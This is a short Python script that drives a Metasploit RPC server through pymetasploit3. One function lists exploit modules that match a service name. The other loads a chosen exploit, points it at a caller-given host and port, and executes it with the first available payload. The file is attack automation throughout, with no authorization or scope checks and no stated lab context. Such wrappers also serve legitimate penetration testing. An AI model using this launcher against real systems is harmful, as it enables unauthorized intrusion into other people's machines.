
from pymetasploit3.msfrpc import MsfRpcClient

def get_exploits(service_name):
    client = MsfRpcClient('your_password_here', ssl=True)
    exploits = client.modules.exploits
    matching_exploits = [e for e in exploits if service_name in e]
    exploit_details = []
    for exploit in matching_exploits:
        exploit_module = client.modules.use('exploit', exploit)
        exploit_details.append({
            'name': exploit,
            'rank': exploit_module.rank,
            'description': exploit_module.description
        })
    return exploit_details

def launch_exploit(exploit_name, rhost, rport):
    client = MsfRpcClient('your_password_here', ssl=True)
    exploit = client.modules.use('exploit', exploit_name)
    exploit['RHOSTS'] = rhost
    exploit['RPORT'] = rport
    payload = exploit.targetpayloads()[0]
    exploit.execute(payload=payload)
